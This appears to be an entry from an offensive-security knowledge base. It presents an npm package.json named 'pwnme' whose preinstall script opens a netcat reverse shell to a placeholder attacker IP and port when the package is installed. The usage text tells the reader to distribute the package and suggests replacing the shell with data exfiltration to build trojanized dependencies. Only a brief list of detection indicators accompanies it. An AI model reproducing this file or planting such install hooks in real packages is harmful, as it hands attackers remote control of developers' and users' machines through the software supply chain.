---
id: fce85cd3-b5b6-4e0d-b6c7-c7ec6921db47
type: code
name: malicious-npm-package-json-with-preinstall
language: JavaScript
verified: true
created_at: '2019-10-31T22:50:53.779389+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - npm
  - malicious-package
  - preinstall
validated: true
---

# malicious-npm-package-json-with-preinstall

## Code

```javascript
{
  "name": "pwnme",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "preinstall": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f"
  },
  "author": "",
  "license": "ISC"
}
```

## Description

This JSON configuration for an npm package includes a malicious preinstall script that executes a bash reverse shell upon installation. It modifies the default npm init output to inject the payload, enabling automatic code execution during npm i.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP for reverse shell connection | 10.10.10.10 |
| $_ATTACKER_PORT | Listening port for the shell | 443 |

## Usage

Save as package.json in a package directory, then distribute or install locally. Customize the preinstall payload for different effects (e.g., data exfil instead of shell). Used in procedures for creating trojanized dependencies.

## Detection

- Static analysis of package.json for suspicious scripts (e.g., nc, rm, mkfifo).
- npm install logs showing preinstall execution.
- Integrity checks on third-party packages via tools like npm audit.

## Related

- [[procedures/Create-Malicious-NodeJS-NPM-Package]]
- [[commands/npm-install-package-with-preinstall-scripts]]
